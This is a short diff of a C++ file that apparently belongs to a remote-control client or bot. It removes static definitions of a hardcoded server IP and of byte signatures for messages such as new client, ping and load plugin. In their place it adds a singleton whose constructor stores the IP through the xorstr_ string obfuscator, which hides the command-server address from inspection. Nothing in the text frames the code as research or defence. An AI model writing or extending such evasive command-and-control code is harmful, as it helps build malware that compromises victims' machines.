@@ -1,12 +1,16 @@
 #include "Variable.h"
 
-char *Variable::ServerAddress = (char *)"124.53.242.93";
-char Variable::NewClientSignature[4] = {'\x01', '\x02', '\x03', '\x04'};
-char Variable::PingSignature[4] = {'\x04', '\x09', '\x07', '\x06'};
-char Variable::SuccessSignature[4] = {'\x01', '\x01', '\x05', '\x06'};
-char Variable::FailSignature[4] = {'\x04', '\x06', '\x07', '\x08'};
-char Variable::LoadPluginSignature[4] = {'\x08', '\x01', '\x03', '\x05'};
-char Variable::SplitterSignature[7] = "NMH523";
+Variable *Variable::Instance = nullptr;
+
+Variable::Variable() { strcpy_s(this->ServerAddress, xorstr_("124.53.242.93")); }
+
+Variable *Variable::getInstance() {
+  if (Instance == NULL) {
+    Instance = new Variable();
+  }
+
+  return Instance;
+}
 
 bool Variable::compareSignature(Variable::Signature sig, char *Payload) {
   switch (sig) {
